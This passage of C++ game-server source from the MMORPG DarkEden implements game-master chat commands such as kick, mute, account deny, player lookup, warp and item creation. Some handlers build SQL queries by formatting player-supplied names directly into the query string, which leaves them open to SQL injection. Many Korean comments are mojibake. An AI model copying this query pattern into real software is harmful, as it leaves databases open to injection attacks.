    pZone->addEffect_LOCKING(pEffectShutDown);
  }

  __END_DEBUG_EX __END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::opkick(GamePlayer *pGamePlayer, string msg,
                          int i) throw(ProtocolException, Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

      size_t j = msg.find_first_of(' ', i + 1);
  string Name = msg.substr(j + 1, msg.size() - j - 1).c_str();

  Creature *pTargetCreature = NULL;

  // NoSuch�. by sigi. 2002.5.2
  __ENTER_CRITICAL_SECTION((*g_pPCFinder))

  pTargetCreature = g_pPCFinder->getCreature_LOCKED(Name);
  if (pTargetCreature == NULL) {
    g_pPCFinder->unlock();
    return;
  }

  Player *pTargetPlayer = pTargetCreature->getPlayer();
  GamePlayer *pTargetGamePlayer = dynamic_cast<GamePlayer *>(pTargetPlayer);
  pTargetGamePlayer->setPenaltyFlag(PENALTY_TYPE_KICKED);
  pTargetGamePlayer->setItemRatioBonusPoint(1);

  if (pGamePlayer != NULL) {
    Creature *pCreature = pGamePlayer->getCreature();
    filelog("change.txt", "[Kick]%s --> %s", pCreature->getName().c_str(),
            Name.c_str());
  }

  __LEAVE_CRITICAL_SECTION((*g_pPCFinder))

  __END_DEBUG_EX __END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::opmute(GamePlayer *pGamePlayer, string msg,
                          int i) throw(ProtocolException, Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

      uint time = 0;
  size_t j = msg.find_first_of(' ', i + 1);
  size_t k = msg.find_first_of(' ', j + 1);
  string Name;
  if (k < msg.size()) {
    Name = msg.substr(j + 1, k - j - 1).c_str();
    time = (uint)atoi(msg.substr(k + 1, msg.size() - k - 1).c_str());
  } else {
    Name = msg.substr(j + 1, msg.size() - j - 1).c_str();
  }

  Creature *pTargetCreature = NULL;
  // NoSuch�. by sigi. 2002.5.2
  __ENTER_CRITICAL_SECTION((*g_pPCFinder))

  pTargetCreature = g_pPCFinder->getCreature_LOCKED(Name);
  if (pTargetCreature == NULL) {
    g_pPCFinder->unlock();
    return;
  }

  Player *pTargetPlayer = pTargetCreature->getPlayer();
  GamePlayer *pTargetGamePlayer = dynamic_cast<GamePlayer *>(pTargetPlayer);

  if (time == 0) {
    pTargetGamePlayer->setPenaltyFlag(PENALTY_TYPE_MUTE);
  } else {
    Effect *pEffect = NULL;
    if (pTargetCreature->isFlag(Effect::EFFECT_CLASS_MUTE)) {
      pEffect = pTargetCreature->findEffect(Effect::EFFECT_CLASS_MUTE);

      pEffect->setDeadline(time * 600);
      pEffect->save(pTargetCreature->getName());
    } else {
      pEffect = new EffectMute(pTargetCreature);
      pEffect->setDeadline(time * 600);
      pEffect->create(pTargetCreature->getName());
      pTargetCreature->addEffect(pEffect);
      pTargetCreature->setFlag(pEffect->getEffectClass());
    }

    GCAddEffect gcAddEffect;
    gcAddEffect.setObjectID(pTargetCreature->getObjectID());
    gcAddEffect.setEffectID(pEffect->getSendEffectClass());
    gcAddEffect.setDuration(time * 600);

    pTargetGamePlayer->sendPacket(&gcAddEffect);
  }

  __LEAVE_CRITICAL_SECTION((*g_pPCFinder))

  __END_DEBUG_EX __END_CATCH
}

////////////20080227 DSG by Kim Sung Yong/////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::opDSG(GamePlayer *pGamePlayer, string msg,
                         int i) throw(ProtocolException, Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

      uint iStat = 0;
  size_t j = msg.find_first_of(' ', i + 1);
  size_t k = msg.find_first_of(' ', j + 1);
  string Name;
  if (k < msg.size()) {
    Name = msg.substr(j + 1, k - j - 1).c_str();
    iStat = (uint)atoi(msg.substr(k + 1, msg.size() - k - 1).c_str());
  } else {
    Name = msg.substr(j + 1, msg.size() - j - 1).c_str();
  }

  Statement *pStmt =
      g_pDatabaseManager->getConnection("DARKEDEN")->createStatement();
  Result *pResult = pStmt->executeQuery(
      "SELECT DsgStat FROM DSGMemberList where Name='%s'", Name.c_str());

  string PlayerID;

  if (pResult->getRowCount() != 0) {
    pResult->next();
    string PlayerID = pResult->getString(1);

    Statement *pStmt2 =
        g_pDatabaseManager->getConnection("DARKEDEN")->createStatement();
    pStmt2->executeQuery(
        "UPDATE DSGMemberList set DsgStat='%d' where Name ='%s'", iStat,
        Name.c_str());
    SAFE_DELETE(pStmt2);
  }

  SAFE_DELETE(pStmt);

  __END_DEBUG_EX __END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::opdenychat(GamePlayer *pGamePlayer, string msg,
                              int i) throw(ProtocolException, Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

      uint level = 0;
  uint time = 0;
  size_t j = msg.find_first_of(' ', i + 1);
  size_t k = msg.find_first_of(' ', j + 1);
  string Name;
  if (k < msg.size()) {
    level = (uint)atoi(msg.substr(j + 1, k - j - 1).c_str());
    Name = msg.substr(k + 1, msg.size() - k - 1).c_str();
  } else {
    return;
  }

  Creature *pTargetCreature = NULL;

  if (level == 1) {
    // level1 = 1�
    time = 1 * 60;
  } else if (level == 2) {
    // level2 = 6�
    time = 6 * 60;
  } else if (level == 3) {
    // level3 = 12�
    time = 12 * 60;
  } else if (level == 4) {
    // level4 = 24�
    time = 24 * 60;
  } else if (level == 5) {
    // level5 = 168�
    time = 168 * 60;
  }

  // NoSuch removal. by sigi. 2002.5.2
  __ENTER_CRITICAL_SECTION((*g_pPCFinder))

  pTargetCreature = g_pPCFinder->getCreature_LOCKED(Name);
  if (pTargetCreature == NULL) {
    g_pPCFinder->unlock();
    return;
  }

  Player *pTargetPlayer = pTargetCreature->getPlayer();
  GamePlayer *pTargetGamePlayer = dynamic_cast<GamePlayer *>(pTargetPlayer);

  if (time == 0) {
    pTargetGamePlayer->setPenaltyFlag(PENALTY_TYPE_MUTE);
  } else {
    Effect *pEffect = NULL;
    if (pTargetCreature->isFlag(Effect::EFFECT_CLASS_MUTE)) {
      pEffect = pTargetCreature->findEffect(Effect::EFFECT_CLASS_MUTE);

      pEffect->setDeadline(time * 600);
      pEffect->save(pTargetCreature->getName());
    } else {
      pEffect = new EffectMute(pTargetCreature);
      pEffect->setDeadline(time * 600);
      pEffect->create(pTargetCreature->getName());
      pTargetCreature->addEffect(pEffect);
      pTargetCreature->setFlag(pEffect->getEffectClass());
    }

    GCAddEffect gcAddEffect;
    gcAddEffect.setObjectID(pTargetCreature->getObjectID());
    gcAddEffect.setEffectID(pEffect->getSendEffectClass());
    gcAddEffect.setDuration(time * 600);

    pTargetGamePlayer->sendPacket(&gcAddEffect);
  }

  __LEAVE_CRITICAL_SECTION((*g_pPCFinder))

  __END_DEBUG_EX __END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::opfreezing(GamePlayer *pGamePlayer, string msg,
                              int i) throw(ProtocolException, Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

      size_t j = msg.find_first_of(' ', i + 1);
  string Name = msg.substr(j + 1, msg.size() - j - 1).c_str();

  Creature *pTargetCreature = NULL;

  // NoSuch removal. by sigi. 2002.5.2
  __ENTER_CRITICAL_SECTION((*g_pPCFinder))

  pTargetCreature = g_pPCFinder->getCreature_LOCKED(Name);
  if (pTargetCreature == NULL) {
    g_pPCFinder->unlock();
    return;
  }

  Player *pTargetPlayer = pTargetCreature->getPlayer();
  GamePlayer *pTargetGamePlayer = dynamic_cast<GamePlayer *>(pTargetPlayer);
  pTargetGamePlayer->setPenaltyFlag(PENALTY_TYPE_FREEZING);

  __LEAVE_CRITICAL_SECTION((*g_pPCFinder))

  __END_DEBUG_EX __END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::opdeny(GamePlayer *pGamePlayer, string msg,
                          int i) throw(ProtocolException, Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

      size_t j = msg.find_first_of(' ', i + 1);
  string Name = msg.substr(j + 1, msg.size() - j - 1).c_str();

  Statement *pStmt =
      g_pDatabaseManager->getConnection("DARKEDEN")->createStatement();
  Result *pResult = pStmt->executeQuery(
      "SELECT PlayerID FROM Slayer where Name='%s'", Name.c_str());

  string PlayerID;

  if (pResult->next()) {
    string PlayerID = pResult->getString(1);

    Statement *pStmt2 = g_pDatabaseManager->getConnection((int)Thread::self())
                            ->createStatement();
    pStmt2->executeQuery("UPDATE Player set Access='DENY' where PlayerID ='%s'",
                         PlayerID.c_str());
    SAFE_DELETE(pStmt2);
  }

  SAFE_DELETE(pStmt);

  __END_DEBUG_EX __END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::opinfo(GamePlayer *pGamePlayer, string msg,
                          int i) throw(ProtocolException, Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

      if (pGamePlayer == NULL) return;

  size_t j = msg.find_first_of(' ', i + 1);
  string Name = msg.substr(j + 1, msg.size() - j - 1).c_str();

  Creature *pTargetCreature = NULL;
  // NoSuch removal. by sigi. 2002.5.2
  __ENTER_CRITICAL_SECTION((*g_pPCFinder))

  pTargetCreature = g_pPCFinder->getCreature_LOCKED(Name);
  if (pTargetCreature == NULL) {
    g_pPCFinder->unlock();
    return;
  }

  StringStream msg;

  msg << "Name : " << Name
      << " Host : " << pTargetCreature->getPlayer()->getSocket()->getHost();

  if (pTargetCreature->isSlayer()) {

    Slayer *pSlayer = dynamic_cast<Slayer *>(pTargetCreature);

    msg << " STR : " << (int)pSlayer->getSTR() << " / "
        << pSlayer->getSTR(ATTR_MAX) << " DEX : " << (int)pSlayer->getDEX()
        << " / " << pSlayer->getDEX(ATTR_MAX)
        << " INT : " << (int)pSlayer->getINT() << " / "
        << pSlayer->getINT(ATTR_MAX) << " DAM : " << (int)pSlayer->getDamage()
        << " / " << pSlayer->getDamage(ATTR_MAX) << " / "
        << pSlayer->getDamage(ATTR_BASIC)
        << " Defense  : " << (int)pSlayer->getDefense()
        << " TOHIT : " << (int)pSlayer->getToHit()
        << " HP : " << (int)pSlayer->getHP() << " / "
        << pSlayer->getHP(ATTR_MAX) << " MP : " << (int)pSlayer->getMP()
        << " / " << pSlayer->getMP(ATTR_MAX)
        << " Fame : " << (int)pSlayer->getFame()
        << " Gold : " << (int)pSlayer->getGold()
        << " StashGold : " << (int)pSlayer->getStashGold();

  } else if (pTargetCreature->isVampire()) {

    Vampire *pVampire = dynamic_cast<Vampire *>(pTargetCreature);

    msg << " STR : " << pVampire->getSTR() << " / "
        << pVampire->getSTR(ATTR_MAX) << " DEX : " << pVampire->getDEX()
        << " / " << pVampire->getDEX(ATTR_MAX)
        << " INT : " << pVampire->getINT() << " / "
        << pVampire->getINT(ATTR_MAX)
        << " Defense  : " << (int)pVampire->getDefense()
        << " TOHIT : " << (int)pVampire->getToHit()
        << " HP : " << (int)pVampire->getHP() << " / "
        << pVampire->getHP(ATTR_MAX) << " Fame : " << (int)pVampire->getFame()
        << " Gold : " << (int)pVampire->getGold()
        << " StashGold : " << (int)pVampire->getStashGold();

  } else if (pTargetCreature->isOusters()) {

    Ousters *pOusters = dynamic_cast<Ousters *>(pTargetCreature);

    msg << " STR : " << pOusters->getSTR() << " / "
        << pOusters->getSTR(ATTR_MAX) << " DEX : " << pOusters->getDEX()
        << " / " << pOusters->getDEX(ATTR_MAX)
        << " INT : " << pOusters->getINT() << " / "
        << pOusters->getINT(ATTR_MAX)
        << " Defense  : " << (int)pOusters->getDefense()
        << " TOHIT : " << (int)pOusters->getToHit()
        << " HP : " << (int)pOusters->getHP() << " / "
        << pOusters->getHP(ATTR_MAX) << " Fame : " << (int)pOusters->getFame()
        << " Gold : " << (int)pOusters->getGold()
        << " StashGold : " << (int)pOusters->getStashGold();
  }

  GCSystemMessage gcSystemMessage;

  gcSystemMessage.setMessage(msg.toString());

  pGamePlayer->sendPacket(&gcSystemMessage);

  __LEAVE_CRITICAL_SECTION((*g_pPCFinder))

  __END_DEBUG_EX __END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::opfind(GamePlayer *pGamePlayer, string msg,
                          int i) throw(ProtocolException, Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

      if (pGamePlayer == NULL) return;

  size_t u = msg.find_first_of('\'');

  if (u != string::npos) {
    filelog("opfind.log", "ID = %s", pGamePlayer->getID().c_str());
    return;
  }

  size_t j = msg.find_first_of(' ', i + 1);
  string Name = msg.substr(j + 1, msg.size() - j - 1).c_str();

  Statement *pStmt =
      g_pDatabaseManager->getConnection("DARKEDEN")->createStatement();
  Result *pResult = pStmt->executeQuery(
      "SELECT ServerID FROM UserIPInfo where Name='%s'", Name.c_str());

  static WorldID_t WorldID = g_pConfig->getPropertyInt("WorldID");

  if (pResult->getRowCount() != 0) {

    pResult->next();

    ServerID_t ServerID = pResult->getInt(1);

    string ServerName =
        g_pGameServerGroupInfoManager->getGameServerGroupInfo(ServerID, WorldID)
            ->getGroupName();

    char msg[100];
    sprintf(msg, g_pStringPool->c_str(STRID_PLAYER_IN_GAMESERVER), Name.c_str(),
            ServerName.c_str());

    GCSystemMessage gcSystemMessage;
    gcSystemMessage.setMessage(msg);
    pGamePlayer->sendPacket(&gcSystemMessage);

  } else {
    //		StringStream msg;
    //		msg <<  Name << "  � �.";

    char msg[100];
    sprintf(msg, g_pStringPool->c_str(STRID_PLAYER_NOT_IN_GAMESERVER),
            Name.c_str());

    GCSystemMessage gcSystemMessage;
    gcSystemMessage.setMessage(msg);
    pGamePlayer->sendPacket(&gcSystemMessage);
  }

  SAFE_DELETE(pStmt);

  __END_DEBUG_EX __END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// �기 �� �기�.. ���~ ��..
// GCSystemMessage� 256� �� 조���. by sigi. 2003.3.22
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::opcredit(GamePlayer *pGamePlayer, string msg,
                            int i) throw(ProtocolException, Error) {
  __BEGIN_TRY

  if (pGamePlayer == NULL)
    return;

  static map<string, string> Credits;

  // Let's keep it hardcoded... hehe  by sigi.
  if (Credits.empty()) {
		Credits["Thank You-Yoon Chang-pil"] = "Server Core (Sep 1999–Sep 2000), Planning (Mar 2001–Mar 2002)";
        Credits["Thank You-Kim Geon-woo"] = "Server, Planning (Sep 1999–Mar 2002)";
		Credits["Thank You-Kim Jin-tae"] = "Client UI, Tools (Sep 1999–Jan 2001)";
        Credits["Thank You-Im Chun-geun"] = "Server, DB (Sep 1999–?)";
		Credits["Thank You-Kim Seong-min"] = "Server, DB (Oct 2000–Mar 2002)";
		Credits["-Thank YouYoon Young-sik"] = "Client Main (Sep 1999–Mar 2002), Server (Apr 2002–Mar 2003). Ah, youth... T_T; unuis@hanmail.net";
		Credits["Thank You-Ji Seong-wook"] = "Client UI, Tools (Feb 2001–Mar 2002), Client Main (Mar 2002–Mar 2003)";
        Credits["Thank You-Jang Hong-chang"] = "Server, DB (Jan 2002–Dec 2002)";
		Credits["Thank You-Bae Jae-hyung"] = "Server (April 2002–)";
        Credits["Thank You-Son Hee-seung"] = "Client UI, Tools (June 2002–January 2003), Client Main (January 2003–)";
		Credits["Thank You-Lee Hee-won"] = "DB, Operations Team Support (June 2002–)";
        Credits["Thank You-Yang Seung-myung"] = "Server (November 2002–)";
        Credits["Thank You-Hong Sang-min"] = "Server (December 2002–)";
  }

  size_t j = msg.find_first_of(' ', i + 1);
  string Name = msg.substr(j + 1, msg.size() - j - 1).c_str();

  map<string, string>::const_iterator itr = Credits.find(Name);

  if (itr != Credits.end()) {
    StringStream msg;
    msg << "[" << itr->first << "] " << itr->second;

    GCSystemMessage gcSystemMessage;
    gcSystemMessage.setMessage(msg.toString());
    pGamePlayer->sendPacket(&gcSystemMessage);
  }

  __END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::opuser(GamePlayer *pGamePlayer, string msg,
                          int i) throw(ProtocolException, Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

      if (pGamePlayer == NULL) return;

  Statement *pStmt =
      g_pDatabaseManager->getDistConnection("PLAYER_DB")->createStatement();
  // Statement* pStmt = g_pDatabaseManager->getConnection( (int)Thread::self()
  // )->createStatement();
  Result *pResult = pStmt->executeQuery(
      "SELECT Count(*) FROM Player where LogOn='GAME' OR LogOn='LOGON'");

  pResult->next();

  int GroupCount = pResult->getInt(1);

  //	StringStream msg;
  //	msg << "   : " << GroupCount << "�";

  char msg[100];
  sprintf(msg, g_pStringPool->c_str(STRID_CURRENT_NUMBER_OF_PLAYER),
          GroupCount);

  GCSystemMessage gcSystemMessage;
  gcSystemMessage.setMessage(msg);
  pGamePlayer->sendPacket(&gcSystemMessage);

  SAFE_DELETE(pStmt);

  __END_DEBUG_EX __END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::optrace(GamePlayer *pGamePlayer, string msg,
                           int i) throw(ProtocolException, Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

      if (pGamePlayer == NULL) return;

  Creature *pCreature = pGamePlayer->getCreature();

  size_t j = msg.find_first_of(' ', i + 1);
  size_t k = msg.find_first_of(' ', j + 1);

  bool isNPCTrace = false;

  if (msg.size() > k &&
      !strncasecmp(msg.substr(j + 1, k - j - 1).c_str(), "NPC", 3))
    isNPCTrace = true;

  string Name;

  if (isNPCTrace) {
    Name = msg.substr(k + 1, msg.size() - k - 1);
  } else {
    Name = msg.substr(j + 1, msg.size() - j - 1);
  }

  Creature *pTargetCreature = NULL;

  // NoSuch�. by sigi. 2002.5.2
  __ENTER_CRITICAL_SECTION((*g_pPCFinder))

  if (isNPCTrace) {
    NPC *pNPC = g_pPCFinder->getNPC_LOCKED(Name);
    pTargetCreature = dynamic_cast<Creature *>(pNPC);
  } else {
    pTargetCreature = g_pPCFinder->getCreature_LOCKED(Name);
  }

  if (pTargetCreature == NULL) {
    g_pPCFinder->unlock();
    return;
  }

  ZoneID_t ZoneNum = pTargetCreature->getZoneID();
  Coord_t ZoneX = pTargetCreature->getX();
  Coord_t ZoneY = pTargetCreature->getY();

  Assert((int)ZoneX < 256);
  Assert((int)ZoneY < 256);
  Assert(pCreature->isPC());

  transportCreature(pCreature, ZoneNum, ZoneX, ZoneY, false);

  __LEAVE_CRITICAL_SECTION((*g_pPCFinder))

  __END_DEBUG_EX __END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::oppay(GamePlayer *pGamePlayer, string msg,
                         int i) throw(ProtocolException, Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

      if (pGamePlayer == NULL) return;

  char str[80];

  if (pGamePlayer->isBillingPlayAvaiable()) {
    strcpy(str, "[Advil] I am currently logged into the billing system and playing the game.");
  } else if (pGamePlayer->isPayPlaying()) {
    Timeval currentTime;
    getCurrentTime(currentTime);
    Timeval payTime = pGamePlayer->getPayPlayTime(currentTime);

    if (pGamePlayer->getPayPlayType() == PAY_PLAY_TYPE_PERSON) {
      strcpy(str, "[Metrotech][Individual] ");
    } else {
      strcpy(str, "[Metrotech][PC Bang] ");
    }

    if (pGamePlayer->getPayType() == PAY_TYPE_FREE) {
      strcat(str, "It's a paid service, but I have a free account.");
    } else if (pGamePlayer->getPayType() == PAY_TYPE_PERIOD) {
      sprintf(str, "You can use %s%s.", str,
              pGamePlayer->getPayPlayAvailableDateTime().toString().c_str());
    } else {
      sprintf(str, "%sUsage time: %d / %d minutes", str, (int)(payTime.tv_sec / 60),
              (int)pGamePlayer->getPayPlayAvailableHours());
    }
  } else {
    strcpy(str, "[Metrotech] Currently playing a free game.");
  }

  GCSystemMessage gcSystemMessage;
  gcSystemMessage.setMessage(str);
  pGamePlayer->sendPacket(&gcSystemMessage);

  __END_DEBUG_EX __END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::opfun(GamePlayer *pGamePlayer, string msg,
                         int i) throw(ProtocolException, Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

      if (pGamePlayer == NULL) return;

  size_t j = msg.find_first_of(' ', i + 1);
  size_t k = msg.find_first_of(' ', j + 1);
  size_t l = msg.find_first_of(' ', k + 1);

  string FunType = trim(msg.substr(j + 1, k - j - 1));
  int value1 = atoi(msg.substr(k + 1, l - k - 1).c_str());
  int value2 = atoi(msg.substr(l + 1, msg.size() - l - 1).c_str());

  if (FunType == "mine") {
    int ItemType = value1;
    int ItemNum = value2;

    ItemType = max(0, ItemType);
    ItemType = min((int)g_pMineInfoManager->getInfoCount() - 1, ItemType);

    ItemNum = max(1, ItemNum);
    ItemNum = min(36, ItemNum);

    Creature *pCreature = pGamePlayer->getCreature();
    Assert(pCreature != NULL);

    /*
    if (!pCreature->isSlayer())
    {
            GCSystemMessage gcSystemMessage;
            gcSystemMessage.setMessage("slayer � ~");
            pGamePlayer->sendPacket (&gcSystemMessage);
            return;
    }
    */

    Zone *pZone = pCreature->getZone();
    Assert(pZone != NULL);

    ItemInfo *pItemInfo =
        g_pItemInfoManager->getItemInfo(Item::ITEM_CLASS_MINE, ItemType);
    if (pItemInfo == NULL)
      return;

    Damage_t MinDamage = pItemInfo->getMinDamage();
    Damage_t MaxDamage = pItemInfo->getMaxDamage();

    for (int i = 0; i < ItemNum; i++) {
      Mine *pInstallMine = new Mine();
      Assert(pInstallMine != NULL);

      ObjectRegistry &OR = pZone->getObjectRegistry();
      OR.registerObject(pInstallMine);

      int SkillLevel = 100;
      Damage_t RealDamage =
          MinDamage +
          (max(0, ((int)MaxDamage * (int)SkillLevel / 100) - MinDamage));

      pInstallMine->setItemType(ItemType);
      pInstallMine->setDir(pCreature->getDir());
      pInstallMine->setDamage(RealDamage);
      pInstallMine->setInstallerName(pCreature->getName());
      pInstallMine->setInstallerPartyID(pCreature->getPartyID());
      pInstallMine->setFlag(Effect::EFFECT_CLASS_INSTALL);

      TPOINT pt = pZone->addItem(pInstallMine, pCreature->getX(),
                                 pCreature->getY(), true, 6000);

      addInstalledMine(pZone, pInstallMine, pt.x, pt.y);
    }

    GCSystemMessage gcSystemMessage;
    gcSystemMessage.setMessage("I planted a landmine.");
    pGamePlayer->sendPacket(&gcSystemMessage);
  } else {
    GCSystemMessage gcSystemMessage;
    gcSystemMessage.setMessage("What the...!? Are you serious?");
    pGamePlayer->sendPacket(&gcSystemMessage);
  }

  __END_DEBUG_EX __END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::opwarp(GamePlayer *pGamePlayer, string msg,
                          int i) throw(ProtocolException, Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

#ifdef __GAME_SERVER__

      if (pGamePlayer == NULL) return;

  Creature *pCreature = pGamePlayer->getCreature();

  size_t j = msg.find_first_of(' ', i + 1);
  size_t k = msg.find_first_of(' ', j + 1);
  size_t l = msg.find_first_of(' ', k + 1);

  string ZoneName = trim(msg.substr(j + 1, k - j - 1));
  ZoneCoord_t ZoneX = atoi(msg.substr(k + 1, l - k - 1).c_str());
  ZoneCoord_t ZoneY = atoi(msg.substr(l + 1, msg.size() - l - 1).c_str());

  int ZoneID = 0;

  // ZoneName 존� ��  �, 존� ID  .
  // ZoneInfo� NULL �� �  문�� 존� ���� ���,
  // Zoneinfo� NULL��� �  문�� 존� ID��� 맴�.
  // (물� ���  �� ���, �� 무�.)
  ZoneInfo *pZoneInfo = g_pZoneInfoManager->getZoneInfoByName(ZoneName);
  if (pZoneInfo != NULL) {
    ZoneID = pZoneInfo->getZoneID();
  } else {
    ZoneID = atoi(ZoneName.c_str());
  }

  if (pCreature->isPC() && ZoneX < 256 && ZoneY < 256) {
    // �� ��� 그� 존� �� 체���.
    // �면 리���.
    try {
      Zone *pZone = getZoneByZoneID(ZoneID);
      // evade warning
      pZone = NULL;
    } catch (Error) {
      return;
    }

    // 그� 존� �� � ��면 ���.
    try {
      transportCreature(pCreature, ZoneID, ZoneX, ZoneY, false);
    } catch (Throwable &t) {
      cerr << t.toString() << endl;
    }
  }

#endif

  __END_DEBUG_EX __END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::opcreate(GamePlayer *pGamePlayer, string msg,
                            int i) throw(ProtocolException, Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

      if (pGamePlayer == NULL) return;

  Creature *pCreature = pGamePlayer->getCreature();
  // FAZ 4 (2026-05-06): opcreate teşhis — fonksiyona giriş + parse adımları
  filelog("opcreate_trace.log", "[OPCREATE] name=%s msg=%s i=%d",
          pCreature->getName().c_str(), msg.c_str(), i);

  size_t j = msg.find_first_of(' ', i + 1);    // class
  size_t k = msg.find_first_of(' ', j + 1);    // type
  size_t l = msg.find_first_of(' ', k + 1);    // option
  size_t lNum = msg.find_first_of('[', k + 1); // num
  size_t rNum = msg.find_first_of(']', k + 1);
  size_t lTime = msg.find_first_of('(', k + 1); // num
  size_t rTime = msg.find_first_of(')', k + 1);
  size_t lGrade = msg.find_first_of('{', k + 1); // num
  size_t rGrade = msg.find_first_of('}', k + 1);

  string optional;

  if (lNum < rNum) {
    optional = msg.substr(lNum + 1, rNum - lNum - 1).c_str();
  }

  ItemType_t ItemType = 255;
  ItemType_t OptionType = 255;

  string ItemClassName = trim(msg.substr(j + 1, k - j - 1));
  Item::ItemClass ItemClass =
      g_pItemFactoryManager->getItemClassByName(ItemClassName);

  // ItemClass� MAX�면 ��� � 찾�� 맴�.
  //  경�� �� ��� ��� �� �� � 견��� .
  if (ItemClass == Item::ITEM_CLASS_MAX) {
    int temp = atoi(ItemClassName.c_str());
    if (temp < 0 || temp >= Item::ITEM_CLASS_MAX) {
      return;
    } else {
      ItemClass = (Item::ItemClass)(temp);
    }
  }

  if (ItemClass == Item::ITEM_CLASS_CORPSE
      //		|| ItemClass == Item::ITEM_CLASS_KEY
      || ItemClass == Item::ITEM_CLASS_MOTORCYCLE ||
      isRelicItem(ItemClass) && optional != "force") {
    // � 매� �~~ by sigi
    GCSystemMessage gcSystemMessage;
    gcSystemMessage.setMessage(
        g_pStringPool->getString(STRID_CANNOT_CREATE_ITEM));

    pGamePlayer->sendPacket(&gcSystemMessage);

    return;
  }

  ItemType = atoi(msg.substr(k + 1, l - k - 1).c_str());

  list<OptionType_t> optionTypes;
  list<OptionType_t> ThirdOptionTypes;

  uint pos = l, previous = l;
  while (previous < string::npos && pos < string::npos) {
    pos = msg.find_first_of(' ', previous + 1);
    string optionString = trim(msg.substr(previous + 1, pos - previous - 1));

    // cout << "optionString: " << optionString.c_str() << endl;

    if (optionString.size() == 0)
      break;

    OptionInfo *pOptionInfo = NULL;

    if (optionString.at(0) == '#') {
      // 3rd Enchant Option, format - #<OptionType>
      // ex : #43 #53 #178

      optionString = optionString.substr(1);

      pOptionInfo = g_pOptionInfoManager->getOptionInfo(optionString);

      if (pOptionInfo == NULL) {
        pOptionInfo =
            g_pOptionInfoManager->getOptionInfo(atoi(optionString.c_str()));

        if (pOptionInfo == NULL)
          break;
      }

      if (pOptionInfo != NULL) {
        OptionType = pOptionInfo->getType();

        if (OptionType != 0) {
          ThirdOptionTypes.push_back(OptionType);
        }
      }
    } else {
      pOptionInfo = g_pOptionInfoManager->getOptionInfo(optionString);

      if (pOptionInfo == NULL) {
        pOptionInfo =
            g_pOptionInfoManager->getOptionInfo(atoi(optionString.c_str()));

        if (pOptionInfo == NULL)
          break;
      }

      if (pOptionInfo != NULL) {
        OptionType = pOptionInfo->getType();

        if (OptionType != 0) {
          optionTypes.push_back(OptionType);
        }
      }
    }

    previous = pos;
  }

  // FAZ 4 (2026-05-04): GM *create option limit pre-check.
  // DB schema (BladeObject/SwordObject/etc.) OptionType varchar(10): two
  // 3-digit option IDs + separator = 7 chars fit, 3+ options overflow ->
  // "Data too long for column" SQLQueryException -> gameserver UNHANDLED
  // EXCEPTION -> crash -> all connected clients disconnect. Hard reject at
  // parser layer; private message to issuing GM only (sendPacket is unicast).
  const size_t MAX_OPTIONS_PER_LIST = 2;
  if (optionTypes.size() > MAX_OPTIONS_PER_LIST ||
      ThirdOptionTypes.size() > MAX_OPTIONS_PER_LIST) {
    char errMsg[256];
    snprintf(errMsg, sizeof(errMsg),
             "[GM Create] Option limit exceeded: max %u allowed per type "
             "(you provided regular=%u, third=%u). DB column is varchar(10); "
             "3+ options would overflow and crash gameserver. Reduce options "
             "and retry.",
             (unsigned)MAX_OPTIONS_PER_LIST,
             (unsigned)optionTypes.size(),
             (unsigned)ThirdOptionTypes.size());
    GCSystemMessage gcOptLimitMsg;
    gcOptLimitMsg.setMessage(errMsg);
    pGamePlayer->sendPacket(&gcOptLimitMsg);

    filelog("opcreateError.log",
            "[%s] OptionLimit class=%d type=%d regular=%u third=%u",
            pCreature->getName().c_str(), (int)ItemClass, (int)ItemType,
            (unsigned)optionTypes.size(),
            (unsigned)ThirdOptionTypes.size());
    return;
  }

  // FAZ 4 (2026-05-06): isPossibleItem check'inden önce parse sonucunu logla
  filelog("opcreate_trace.log",
          "[OPCREATE-PARSED] name=%s ItemClass=%d ItemType=%d optCount=%u thirdOptCount=%u",
          pCreature->getName().c_str(), (int)ItemClass, (int)ItemType,
          (unsigned)optionTypes.size(), (unsigned)ThirdOptionTypes.size());

  // �� ��   �� �면 리���.
  if (!g_pItemInfoManager->isPossibleItem(ItemClass, ItemType, optionTypes)) {
    filelog("opcreate_trace.log",
